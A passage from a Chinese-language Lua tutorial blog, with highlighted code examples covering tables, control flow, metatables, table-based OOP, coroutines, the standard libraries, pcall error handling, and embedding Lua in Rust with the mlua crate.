<span class="token function">print</span><span class="token punctuation">(</span>table2<span class="token punctuation">[</span><span class="token number">01101001001</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">-- 输出: 110011100110.0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>lua的表是引用类型,无论用哪个变量修改表内容，都会影响原表：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">&#125;</span>
b <span class="token operator">=</span> a      <span class="token comment">-- b 和 a 指向同一张表</span>
b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">10</span>
<span class="token function">print</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment">-- 输出 10</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="全局表"><a href="#全局表" class="headerlink" title="全局表"></a>全局表</h3><p>所有的全局变量都以键值对的形式存在一个大表里，即全局表<code>_G</code></p>
<h3 id="判断语句"><a href="#判断语句" class="headerlink" title="判断语句"></a>判断语句</h3><p>真假为 <code>true</code> 和 <code>false</code></p>
<p>不等于是 <code>~=</code></p>
<p>支持<code>and</code> <code>or</code> <code>not</code>逻辑运算</p>
<div class="note danger flat"><p><strong>重要</strong>：只有<code>nil</code>和<code>false</code>代表假，其余所有包括<code>0</code>都表示真</p>
</div>
<p>分支判断格式：</p>
<pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">if</span> <span class="token number">1</span> <span class="token operator">&lt;=</span> <span class="token number">10</span> <span class="token keyword">then</span>
    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"1 &lt;= 10"</span><span class="token punctuation">)</span>
<span class="token keyword">elseif</span> <span class="token number">1</span> <span class="token operator">></span> <span class="token number">10</span> <span class="token keyword">then</span> 
    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" 1 > 10"</span><span class="token punctuation">)</span>
<span class="token keyword">else</span> 
    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p>for循环，<code>break</code>退出循环</p>
<pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token comment">-- 数值循环：从1到10，步长为2</span>
<span class="token keyword">for</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token keyword">do</span>
    <span class="token function">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token keyword">end</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>对于遍历表，可以有更简单的写法：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">t <span class="token operator">=</span> <span class="token punctuation">&#123;</span>a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">&#125;</span>
<span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> <span class="token function">pairs</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span> <span class="token keyword">do</span>
    <span class="token function">print</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>
<span class="token keyword">end</span>
<span class="token comment">-- 输出可能是：</span>
<span class="token comment">-- 1 1</span>
<span class="token comment">-- 2 2</span>
<span class="token comment">-- 3 3</span>
<span class="token comment">-- a 10</span>
<span class="token comment">-- b 20</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>严格按照索引顺序输出，用ipairs，遇到nil就会停止：</p>
<pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">t <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> a <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">&#125;</span>
<span class="token keyword">for</span> i<span class="token punctuation">,</span> v <span class="token keyword">in</span> <span class="token function">ipairs</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span> <span class="token keyword">do</span>
    <span class="token function">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> v<span class="token punctuation">)</span>
<span class="token keyword">end</span>
<span class="token comment">-- 输出：</span>
<span class="token comment">-- 1 10</span>
<span class="token comment">-- 2 20</span>
<span class="token comment">-- 3 30</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="跨文件操作"><a href="#跨文件操作" class="headerlink" title="跨文件操作"></a>跨文件操作</h3><h4 id="dofile"><a href="#dofile" class="headerlink" title="dofile"></a>dofile</h4><p>相当于把一个lua文件搬过来，全局变量也会生效，并在新文件执行时跟着执行</p>
<h4 id="loadfile"><a href="#loadfile" class="headerlink" title="loadfile"></a>loadfile</h4><p>把文件里的内容看做是一个函数，可在新文件里被调用</p>
<h4 id="require"><a href="#require" class="headerlink" title="require"></a>require</h4><p>获取文件里的内容，不会污染当前作用域，通过变量调用里面的变量或方法，在某些沙盒环境下不可用</p>
<h3 id="元表-metatables"><a href="#元表-metatables" class="headerlink" title="元表(metatables)"></a>元表(metatables)</h3><p>用来”自定义行为”。每个table都有一个metatable，有点像默认函数，未定义则使用lua的默认实现</p>
<p>部分常用的元表方法包括：</p>
<p>__add（加法操作）</p>
<p>__call（表作为函数调用）</p>
<p>__div（除法操作）</p>
<p>__eq（等于比较）</p>
<p>__index（访问不存在的键）</p>
<p>__le（小于等于比较）</p>
<p>__lt（小于比较）</p>
<p>__mod（取余操作）</p>
<p>__mul（乘法操作）</p>
<p>__newindex（赋值给不存在的键）</p>
<p>__sub（减法操作）</p>
<p>__tostring（字符串表示）</p>
<p>__unm（取反操作）</p>
<p>使用举例：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token comment">-- 创建一个普通表</span>
<span class="token keyword">local</span> myTable <span class="token operator">=</span> <span class="token punctuation">&#123;</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">&#125;</span>

<span class="token comment">-- 创建元表</span>
<span class="token keyword">local</span> myMetatable <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    __index <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>table<span class="token punctuation">,</span> key<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token string">"Key "</span> <span class="token operator">..</span> key <span class="token operator">..</span> <span class="token string">" not found"</span>
    <span class="token keyword">end</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">-- 设置元表</span>
<span class="token function">setmetatable</span><span class="token punctuation">(</span>myTable<span class="token punctuation">,</span> myMetatable<span class="token punctuation">)</span>

<span class="token comment">-- 测试</span>
<span class="token function">print</span><span class="token punctuation">(</span>myTable<span class="token punctuation">.</span>a<span class="token punctuation">)</span>  <span class="token comment">-- 输出 1</span>
<span class="token function">print</span><span class="token punctuation">(</span>myTable<span class="token punctuation">.</span>c<span class="token punctuation">)</span>  <span class="token comment">-- 输出 Key c not found</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="在lua中实现OOP"><a href="#在lua中实现OOP" class="headerlink" title="在lua中实现OOP"></a>在lua中实现OOP</h2><p>一个类需要有一些数据，一些方法，构造函数（析构函数），并将它们封装起来，以及需要能完成继承</p>
<p>lua的table天然可以存数据和方法，继承就是将现有数据拷贝一份，不得不再次感慨table的强大</p>
<h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">Person <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  <span class="token comment">-- 类是一个表</span>
Person<span class="token punctuation">.</span>__index <span class="token operator">=</span> Person  <span class="token comment">-- 使得对象能访问到类的方法</span>

<span class="token keyword">function</span> Person<span class="token punctuation">:</span><span class="token function">new</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
    <span class="token keyword">local</span> self <span class="token operator">=</span> <span class="token function">setmetatable</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> Person<span class="token punctuation">)</span>  <span class="token comment">-- 创建一个新表，并将其元表设置为 Person</span>
    self<span class="token punctuation">.</span>name <span class="token operator">=</span> name  <span class="token comment">-- 为对象添加属性</span>
    <span class="token keyword">return</span> self  <span class="token comment">-- 返回这个新对象</span>
<span class="token keyword">end</span>

<span class="token keyword">function</span> Person<span class="token punctuation">:</span><span class="token function">speak</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"My name is "</span> <span class="token operator">..</span> self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>
<span class="token keyword">end</span>

person1 <span class="token operator">=</span> Person<span class="token punctuation">:</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token string">"John"</span><span class="token punctuation">)</span>  <span class="token comment">-- 创建一个对象</span>
person1<span class="token punctuation">:</span><span class="token function">speak</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">-- 调用方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到，对Person类定义一个方法，实现构造函数，就是new一个新表，然后把类作为新表的元表，并提前设置如果访问新表没有的元素就去Person类的表里找（__index）</p>
<p>在此基础上，我们在Person里增加方法speak，新表person1里调用时，里面没有speak函数，就触发找不到元素的行为，即其元表里的<strong>index函数，这里</strong>index = 后面是个表，就是把对应的函数名在表里接着找</p>
<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>继承即新建一个类，然后把父类设置成自己的元表。</p>
<pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token comment">-- 继承示例</span>
Student <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
Student<span class="token punctuation">.</span>__index <span class="token operator">=</span> Student
<span class="token function">setmetatable</span><span class="token punctuation">(</span>Student<span class="token punctuation">,</span> Person<span class="token punctuation">)</span>  <span class="token comment">-- Student 继承自 Person</span>

<span class="token keyword">function</span> Student<span class="token punctuation">:</span><span class="token function">new</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> grade<span class="token punctuation">)</span>
    <span class="token keyword">local</span> self <span class="token operator">=</span> Person<span class="token punctuation">:</span><span class="token function">new</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>  <span class="token comment">-- 调用父类构造函数</span>
    <span class="token function">setmetatable</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> Student<span class="token punctuation">)</span>    <span class="token comment">-- 设置为 Student 类型</span>
    self<span class="token punctuation">.</span>grade <span class="token operator">=</span> grade
    <span class="token keyword">return</span> self
<span class="token keyword">end</span>

<span class="token keyword">function</span> Student<span class="token punctuation">:</span><span class="token function">study</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token function">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>name <span class="token operator">..</span> <span class="token string">" is studying in grade "</span> <span class="token operator">..</span> self<span class="token punctuation">.</span>grade<span class="token punctuation">)</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><p>子类可以覆写父类方法，原理也很直观，表里有对应的方法就不会触发__index去找元表了：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">function</span> Student<span class="token punctuation">:</span><span class="token function">speak</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">-- 重写父类方法</span>
    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Hi, I'm "</span> <span class="token operator">..</span> self<span class="token punctuation">.</span>name <span class="token operator">..</span> <span class="token string">", a student in grade "</span> <span class="token operator">..</span> self<span class="token punctuation">.</span>grade<span class="token punctuation">)</span>
<span class="token keyword">end</span>

<span class="token comment">-- 测试多态</span>
<span class="token keyword">local</span> people <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    Person<span class="token punctuation">:</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token string">"Alice"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    Student<span class="token punctuation">:</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token string">"Bob"</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">for</span> _<span class="token punctuation">,</span> person <span class="token keyword">in</span> <span class="token function">ipairs</span><span class="token punctuation">(</span>people<span class="token punctuation">)</span> <span class="token keyword">do</span>
    person<span class="token punctuation">:</span><span class="token function">speak</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">-- 会调用各自的speak方法</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="冒号语法糖"><a href="#冒号语法糖" class="headerlink" title="冒号语法糖"></a>冒号语法糖</h3><p>Person:speak等价于Person.speak(self)，也就是帮你把函数的调用者作为参数传进去了</p>
<h2 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h2><p>Lua不处理多线程</p>
<p>Lua用<strong>协程</strong>处理多任务。</p>
<p>协程不是抢占式的，而是需要再代码中显式标注出什么时候可以安全地暂停当前任务，因而更容易理解，也能免去很多并行的问题，当然同时也失去了多核处理的能力</p>
<h3 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h3><blockquote>
<p>coroutine.create(function)函数会创建一个协程，遇见一个yield()调用后就会回到调用者处执行<br>coroutine.resume()会回到上次yield()被调用之后的地方继续执行，返回一个状态码以及被调用时使用的参数</p>
</blockquote>
<pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">function</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">local</span> a <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">local</span> b <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">for</span> v <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span> <span class="token keyword">do</span>
        <span class="token keyword">local</span> c <span class="token operator">=</span> a <span class="token operator">+</span> b
        a <span class="token operator">=</span> b
        b <span class="token operator">=</span> c
        <span class="token function">print</span><span class="token punctuation">(</span>a <span class="token operator">..</span> <span class="token string">" "</span> <span class="token operator">..</span> b<span class="token punctuation">)</span>
    <span class="token keyword">end</span>
    <span class="token keyword">return</span> a
    
<span class="token keyword">end</span>

<span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"start"</span><span class="token punctuation">)</span>
start <span class="token operator">=</span> coroutine<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span>
coroutine<span class="token punctuation">.</span><span class="token function">resume</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span>
<span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"end"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>适用于耗时较长的计算或者网络操作</p>
<h2 id="常用库"><a href="#常用库" class="headerlink" title="常用库"></a>常用库</h2><h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3><p>math提供了很多数学函数，包括三角函数，随机数，取整等<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token comment">--三角函数</span>
math<span class="token punctuation">.</span><span class="token function">cos</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
math<span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
math<span class="token punctuation">.</span>pi

<span class="token comment">--随机数</span>
math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">--默认生成一个小于1的随机实数，输入参数将范围调整到0-rdi或者rdi到rsi</span>
math<span class="token punctuation">.</span><span class="token function">randomseed</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">--修改随机数种子</span>

<span class="token comment">--取整</span>
math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token number">3.3</span><span class="token punctuation">)</span> <span class="token comment">--3</span>
math<span class="token punctuation">.</span><span class="token function">ceil</span><span class="token punctuation">(</span><span class="token number">3.3</span><span class="token punctuation">)</span>  <span class="token comment">--4</span>
math<span class="token punctuation">.</span><span class="token function">modf</span><span class="token punctuation">(</span><span class="token number">3.3</span><span class="token punctuation">)</span> <span class="token comment">--3，向0取整</span>

<span class="token comment">--极限值</span>
math<span class="token punctuation">.</span>maxinteger   <span class="token comment">--0x7fff……fff = 2^63 - 1</span>
math<span class="token punctuation">.</span>mininteger<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p>一些对字符串进行操作的标准函数<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">stringl<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>  <span class="token comment">--返回长度，等价于#s</span>
string<span class="token punctuation">.</span><span class="token function">rep</span><span class="token punctuation">(</span><span class="token string">"adb"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment">--adbadbadb</span>
string<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">)</span> <span class="token comment">--cba</span>
string<span class="token punctuation">.</span><span class="token function">upper</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">)</span> <span class="token comment">--ABC</span>
string<span class="token punctuation">.</span><span class="token function">lower</span><span class="token punctuation">(</span><span class="token string">"ABC"</span><span class="token punctuation">)</span> <span class="token comment">--abc</span>
string<span class="token punctuation">.</span><span class="token function">sub</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>   <span class="token comment">--截取s字符串的从i到j部分，j是负数时表示从后开始数，lua里从1开始，返回新字符串</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="io"><a href="#io" class="headerlink" title="io"></a>io</h3><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> name <span class="token operator">=</span> io<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"你好，"</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> <span class="token string">"！\n"</span><span class="token punctuation">)</span>

<span class="token comment">-- 文件操作（io库）</span>
<span class="token keyword">local</span> f <span class="token operator">=</span> io<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"hello.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>
f<span class="token punctuation">:</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"Hello, Lua!\n"</span><span class="token punctuation">)</span>
f<span class="token punctuation">:</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p>一般来说，lua行为是被主程序调用的，错误该由主程序来处理，但是lua中依然实现了错误处理机制</p>
<p>pcall（protected call）用于安全地调用函数，同时支持自定义的错误处理方法。会返回成功与否：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> ok<span class="token punctuation">,</span> msg <span class="token operator">=</span> <span class="token function">pcall</span><span class="token punctuation">(</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token comment">--[[some code]]</span>
  <span class="token keyword">if</span> <span class="token comment">--[[panic]]</span> <span class="token keyword">then</span> <span class="token function">error</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">end</span>
  <span class="token comment">--[[some code]]</span>
  <span class="token function">print</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
  <span class="token comment">--[[some code]]</span>
  <span class="token keyword">end</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> ok <span class="token keyword">then</span> 
  ……
<span class="token keyword">else</span>
  <span class="token comment">--[[handle error here]]</span>
<span class="token keyword">end</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="嵌入cpprust语言项目"><a href="#嵌入cpprust语言项目" class="headerlink" title="嵌入cpprust语言项目"></a>嵌入<del>cpp</del>rust语言项目</h2><p>lua设计之初就是为了方便嵌入，自然是可以在其他语言的项目中方便的引入</p>
<p>首先在cargo.toml里添加：<br><pre class="line-numbers language-toml" data-language="toml"><code class="language-toml"><span class="token key property">mlua</span> <span class="token punctuation">=</span> <span class="token punctuation">&#123;</span> <span class="token key property">version</span> <span class="token punctuation">=</span> <span class="token string">"0.9"</span><span class="token punctuation">,</span> <span class="token key property">features</span> <span class="token punctuation">=</span> <span class="token punctuation">[</span><span class="token string">"lua54"</span><span class="token punctuation">,</span> <span class="token string">"vendored"</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<h3 id="mlua"><a href="#mlua" class="headerlink" title="mlua"></a>mlua</h3><p>README里给出了如下的示例代码：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">mlua<span class="token punctuation">::</span>prelude<span class="token punctuation">::</span></span><span class="token operator">*</span><span class="token punctuation">;</span>

<span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">LuaResult</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> lua <span class="token operator">=</span> <span class="token class-name">Lua</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> map_table <span class="token operator">=</span> lua<span class="token punctuation">.</span><span class="token function">create_table</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    map_table<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"one"</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    map_table<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"two"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

    lua<span class="token punctuation">.</span><span class="token function">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"map_table"</span><span class="token punctuation">,</span> map_table<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

    lua<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token string">"for k,v in pairs(map_table) do print(k,v) end"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>首先Lua：：new()的时候创建了一个lua虚拟机，与rust程序内存隔离，和c/cpp一样通过<strong>虚拟栈</strong>完成沟通</p>
<p>比如这里的<code>let map_table = lua.create_table()?;</code>，rust程序告诉虚拟机要调用create_table()函数，lua VM执行后将地址压入栈，然后rust取出来给变量赋值</p>
<p>接下来同理，准备表地址压入参数，触发执行并pop出参数，相比如c/cpp里手动管理这个栈，mlua已经完成了封装。这个流程是全串行的，虽然lua VM看起来像一个独立的进程，但是实际上始终没出现新的线程/进程，这里也完全没有并发问题</p>
<h3 id="声明函数"><a href="#声明函数" class="headerlink" title="声明函数"></a>声明函数</h3><p>所谓嵌入rust项目，其实rust用mlua理论上就可以不用单独的.lua文件了</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">create_function</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'lua</span><span class="token punctuation">,</span> <span class="token class-name">A</span><span class="token punctuation">,</span> <span class="token class-name">R</span><span class="token punctuation">,</span> <span class="token class-name">F</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'lua</span> <span class="token keyword">self</span><span class="token punctuation">,</span> func<span class="token punctuation">:</span> <span class="token class-name">F</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token class-name">Function</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'lua</span><span class="token operator">>></span>
<span class="token keyword">where</span>
    <span class="token class-name">A</span><span class="token punctuation">:</span> <span class="token class-name">FromLuaMulti</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'lua</span><span class="token operator">></span><span class="token punctuation">,</span>
    <span class="token class-name">R</span><span class="token punctuation">:</span> <span class="token class-name">IntoLuaMulti</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'lua</span><span class="token operator">></span><span class="token punctuation">,</span>
    <span class="token class-name">F</span><span class="token punctuation">:</span> <span class="token class-name">Fn</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'lua</span> <span class="token class-name">Lua</span><span class="token punctuation">,</span> <span class="token class-name">A</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token class-name">R</span><span class="token operator">></span> <span class="token operator">+</span> <span class="token class-name">MaybeSend</span> <span class="token operator">+</span> <span class="token lifetime-annotation symbol">'static</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其实是一个转化函数，可以把rust函数转化成lua函数，封装了一切底层细节，用的时候只需要：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> add <span class="token operator">=</span> lua<span class="token punctuation">.</span><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>_<span class="token punctuation">,</span> <span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token keyword">i32</span><span class="token punctuation">,</span> <span class="token keyword">i32</span><span class="token punctuation">)</span><span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">Ok</span><span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>传入一个闭包</p>
